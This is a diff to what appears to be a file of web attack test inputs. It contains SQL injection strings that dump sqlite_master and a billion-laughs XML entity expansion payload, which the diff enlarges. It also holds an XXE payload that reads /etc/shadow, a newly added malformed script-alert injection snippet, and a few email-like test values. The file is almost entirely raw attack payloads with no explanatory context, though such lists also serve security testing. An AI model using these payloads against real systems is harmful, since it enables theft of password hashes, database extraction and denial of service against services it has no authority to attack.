@@ -6,16 +6,15 @@ upute...
 tower' or 0=0 union SELECT * FROM sqlite_master;--
 tower' or 0=0 ;--
 
-<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY>
-<!ENTITY bar "World ">
-<!ENTITY t1 "&bar;&bar;">
+<!ENTITY bar "lol ">
+<!ENTITY t1 "&bar;&bar;&bar;&bar;&bar;&bar;">
 <!ENTITY t2 "&t1;&t1;&t1;&t1;">
 <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
 ]>
 <foo>
-Hello &t3;
+&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;&t3;
 </foo>
 
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -23,6 +22,10 @@ Hello &t3;
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
 <foo>&xxe;</foo>
+
+<note>
+script>javascript:alert('XXE Injection');/script>
+</note>
 
 freestar rockxy@telemol.club
 boyscoutscattle havenlaw@foohurfe.com 
